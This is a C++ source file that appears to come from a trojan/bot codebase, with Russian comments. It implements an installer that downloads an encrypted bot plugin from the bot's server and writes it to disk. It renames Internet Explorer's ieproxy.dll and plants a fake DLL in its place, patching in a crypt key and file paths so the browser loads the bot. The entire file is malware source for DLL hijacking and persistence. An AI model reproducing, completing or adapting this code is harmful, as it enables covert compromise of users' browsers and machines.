
#include <windows.h>
#include <shlobj.h>

#include "stdafx.h"
#include "BotCore.h"
#include "Splice.h"
#include "DllLoader.h"
#include "Plugins.h"

#include "DbgRpt.h"
#include "Utils.h"
#include "getsec.h"

#include "BotSocket.h"


//----------------------------------------------------------------------------
#include "BotDebug.h"

namespace LDRDEBGTEMPLATES
{
	#include "DbgTemplates.h"
}

#define FAKEDLLDBG LDRDEBGTEMPLATES::DBGOutMessage<>

void XorCrypt(const LPBYTE Key, DWORD KeySize, LPBYTE Buffer, DWORD Size)
{
	DWORD a = 0;

	while (a < Size)
	{
		DWORD b = 0;
		while (b < KeySize)
		{
			Buffer[a] ^= (Key[b] + (a * b));
			b++;
		}
		a++;
	}
}

GUID GenerateCryptKey()
{
	GUID key;

	m_memset(&key, 0, sizeof(key));
	CoCreateGuid(&key);
	return key;
}

wstring GenerateRandomPlugPath()
{
	return wstring(L"c:\\randbot.plug");
}

wstring CreateNewTargetName(const wstring& TargetName)
{
	wstring result;
	result = wstring(L"l") + TargetName;
	
	return result;
}


LPBYTE LookupAnchor(const LPVOID Buffer, DWORD BufferSize, const LPBYTE Anchor, DWORD AnchorSize)
{
	BYTE* Current = (BYTE*)Buffer;
	BYTE* Limit   = Current + BufferSize - AnchorSize;

	while (Current < Limit)
	{
		if (m_memcmp(Current, Anchor, AnchorSize) == 0)
		{
			return Current;
		}
		Current++;
	}
	return NULL;
}


LPBYTE CreateFakeDllWithBuiltingSettings(
	const GUID & CryptKey,
	const wstring& DllName,
	const wstring& BotPlugPath,
	const LPVOID DllBody,
	const DWORD  DllSize
	)
{
	const char CryptKeyAnchor[]    = "A6B7D7BE1E374CD";
	const char RealDllNameAnchor[] = "5BC11231-93CF-4815-8B45-7E7579F39561";
	const char BotPlugPathAnchor[] = "4533703D-7B7F-48FE-A3DA-3155AC13EACB";

	struct AnchorDesc
	{
		LPBYTE Anchor;
		DWORD  AnchorSize;
		DWORD  AnchorBufferSize;
		
		LPBYTE Value;
		DWORD  ValueSize;
		bool   EncryptValue;

	} ReplaceByAnchorList[] = 
	{
		{ (LPBYTE)&CryptKeyAnchor, sizeof(CryptKeyAnchor), 
		  16, 
		  (LPBYTE)&CryptKey, 16, false 
		},
		
		{ (LPBYTE)&RealDllNameAnchor, sizeof(RealDllNameAnchor), 
		  MAX_PATH * sizeof(WCHAR), 
		  (LPBYTE)DllName.t_str(), DllName.Length() * sizeof(WCHAR), true 
		},

		{ (LPBYTE)&BotPlugPathAnchor, sizeof(BotPlugPathAnchor), 
		  MAX_PATH * sizeof(WCHAR), 
		  (LPBYTE)BotPlugPath.t_str(), BotPlugPath.Length() * sizeof(WCHAR), true 
		}
	};

	LPVOID NewDllBody = MemAlloc(DllSize);

	m_memcpy(NewDllBody, DllBody, DllSize);

	DWORD ReplacedCount = 0;
	for (DWORD i = 0; i < ARRAYSIZE(ReplaceByAnchorList); i++)
	{
		AnchorDesc& ad = ReplaceByAnchorList[i];
		
		// Если данных больше, чем буффер, берем следующую настойку
		if (ad.ValueSize > ad.AnchorBufferSize) continue;

		// Ищем якорь
		LPBYTE AnchorBuffer = LookupAnchor(NewDllBody, DllSize, ad.Anchor, ad.AnchorSize);

		// Если якорь не найден - берем следующую настойку
		if (AnchorBuffer == NULL) continue;

		// Обнуляем найденный буфер
		m_memset(AnchorBuffer, 0, ad.AnchorBufferSize);

		// Копируем данные в буффер
		m_memcpy(AnchorBuffer, ad.Value, ad.ValueSize);

		// Если стоит признак шифровать - шифруем весь буффер
		if (ad.EncryptValue) 
		{
			XorCrypt((const LPBYTE)&CryptKey, 16, AnchorBuffer, ad.AnchorBufferSize);
		}

		ReplacedCount++;
	}

	// Если что-то не влезает или не находится - возвращаем ошибку.
	if (ReplacedCount != ARRAYSIZE(ReplaceByAnchorList))
	{
		MemFree(NewDllBody);
		NewDllBody = NULL;
	}

	return (LPBYTE)NewDllBody;
}

/*
IE8 
C:\Program Files\Internet Explorer\sqmapi.dll
C:\Program Files\Internet Explorer\xpshims.dll
C:\Program Files\Internet Explorer\ieproxy.dll

IE7
C:\Program Files\Internet Explorer\ieproxy.dll
C:\Program Files\Internet Explorer\custsat.dll

*/
/*
Ie8, Ie7
- выбрать дллку
- переименовать ее в новую
- создать на ее месте свою
- вшить в дллку путь к переименованной

Ie6
- выбрать длл (системную, которую подгружает IE)
- создать в папке IE с таким же именем
- вшить в дллку путь с системной длл

*/

bool SelectTargetIeDll(wstring & DllDirectory, wstring & DllName)
{
	// Check IE version from registry
	DllDirectory = L"C:\\Program Files\\Internet Explorer";
	DllName = L"ieproxy.dll";

	return true;
}

LPVOID GetBuiltinFakeDllBody(DWORD & Size)
{
	return File::ReadToBufferA("fake.dll", Size);
	//return GetSectionData("FakeDllBody", &Size);
}

void KillAllIeProcesses()
{
	FAKEDLLDBG("KillAllIeProcesses", "runned");
}


BOOL InstallForIe(const char* BotPlugName, const void* SelfBody, DWORD SelfBodySize)
{
	FAKEDLLDBG("InstallForIe", 
		"Started BotPlugName='%s' InstallerBody=0x%X InstallerBodySize=%u", 
		BotPlugName, SelfBody, SelfBodySize);

	LPBYTE FakeDllWithSettings = NULL;
	BOOL   result = FALSE;

	do
	{
		DWORD  FakeDllSize = 0;
		LPVOID FakeDllBody = GetBuiltinFakeDllBody(FakeDllSize);

		FAKEDLLDBG("InstallForIe", 
			"GetBuiltinFakeBody() dll=0x%X size=%u", FakeDllBody, FakeDllSize);

		// Проверка на встроенность тела FakeDll
		if (FakeDllBody == NULL) break;

		// Generate crypt key
		GUID CryptKey = GenerateCryptKey();

		// Generate random path for bot.plug (User\AppData)
		wstring BotPlugPath = GenerateRandomPlugPath();
		FAKEDLLDBG("InstallForIe", 
			"GenerateRandomPlugPath() result='%S'", BotPlugPath.t_str());

		// Выбираем дллку для замещения.
		wstring DllDirectory;
		wstring DllName;

		bool DllSelected = SelectTargetIeDll(DllDirectory, DllName);
		FAKEDLLDBG("InstallForIe", 
			"SelectTargetIeDll() result=%d DllDirectory='%S' TargetDllName='%S'", 
			DllSelected, DllDirectory.t_str(), DllName.t_str());

		if (!DllSelected) break;

		// Для сервера приводим регистр к нижнему
		string PlugName = BotPlugName;
		STR::AnsiLowerCase(PlugName.t_str());

		// Качаем плагин бота с вшитыми параметрами для запуска
		DWORD  PlugSize = 0;
		LPBYTE Plug = Plugin::DownloadEx(PlugName.t_str(), NULL, &PlugSize, true, false, NULL);
		FAKEDLLDBG("InstallForIe", "DownloadEx result module=0x%X size=%u", Plug, PlugSize);
		
		// Не удалось скачать нужный Bot.plug
		if (Plug == NULL) break;

		XorCrypt((LPBYTE)&CryptKey, sizeof(GUID), Plug, PlugSize);

		// Записываем шифрованое тело бота в файл
		File::WriteBufferW(BotPlugPath.t_str(), Plug, PlugSize);

		// Создаем новое имя для дллки, которую переименовываем.
		wstring NewTargetName = CreateNewTargetName(DllName);
		FAKEDLLDBG("InstallForIe", "CreateNewTargetName() result='%S'", NewTargetName.t_str());

		// Встраиваем в фейковую длл все параметры, необходимые для работы 
		// (crypt key, new target dll path, path to crypted botplug) 
		FakeDllWithSettings = CreateFakeDllWithBuiltingSettings(CryptKey, 
			NewTargetName, BotPlugPath, FakeDllBody, FakeDllSize);

		FAKEDLLDBG("InstallForIe", "CreateFakeDllWithBuiltingSettings() result=0x%X", FakeDllWithSettings);

		if (FakeDllWithSettings == NULL) break;

		wstring TargetDllPath = DllDirectory + L"\\" + DllName;
		wstring NewTargetPath = DllDirectory + L"\\" + NewTargetName;

		// Пробуем переменовать целевую DLLку
		// Если не получается - пробуем прибить все процессы IE и пробуем 
		// переименовывать опять.

		DWORD MaxAttemptsCount = 5;
		DWORD AttemptsCount = 0;

		for (DWORD i = 0; i < MaxAttemptsCount; i++)
		{
			FAKEDLLDBG("InstallForIe", "Try to MoveFile(Src='%S',Dst='%S')", TargetDllPath.t_str(), NewTargetPath.t_str());

			BOOL MoveResult = MoveFileW(TargetDllPath.t_str(), NewTargetPath.t_str());
			
			if (MoveResult == TRUE) break;

			KillAllIeProcesses();
			AttemptsCount++;
		}

		FAKEDLLDBG("InstallForIe", "MoveFile results AttemptsCount=%u MaxAttemptsCount=%u",
			AttemptsCount, MaxAttemptsCount);

		if (AttemptsCount == MaxAttemptsCount) break;
		
		// Если переименованиме прошло успешно - сохраняем дллку
		DWORD Written = File::WriteBufferW(TargetDllPath.t_str(), FakeDllWithSettings, FakeDllSize);

		FAKEDLLDBG("InstallForIe", "WriteBuffer for target dll.(Written=%u FakeDllSize=%u)",
			Written, FakeDllSize);

		if (Written != FakeDllSize) break;

		result = TRUE;
		// report result
	}
	while (false);

	if (FakeDllWithSettings != NULL) MemFree(FakeDllWithSettings);

	FAKEDLLDBG("InstallForIe", "Finished with result=%d",result);
	return result;
}

BOOL WINAPI FakeInstall(
	const char* BotPlugName, 
	const char* Target, 
	const void* InstallerBody, 
	DWORD InstallerBodySize)
{
	FAKEDLLDBG("FakeInstall", 
		"Started BotPlugName='%s' Target='%s' InstallerBody=0x%X InstallerBodySize=%u", 
		BotPlugName, Target, InstallerBody, InstallerBodySize);

	InstallForIe(BotPlugName, InstallerBody, InstallerBodySize);

	return FALSE;
}

// Предназначена для внешнего запуска ф-ций тестирования 
void WINAPI Export_RunTests()
{
}

#pragma comment(linker, "/ENTRY:FakeDllInstallerDllMain" )

DWORD WINAPI FakeDllInstallerDllMain(HINSTANCE , DWORD reason, LPVOID )
{
	FAKEDLLDBG("FakeDllInstallerDllMain", "called with reason=%d", reason);

	return TRUE;
}
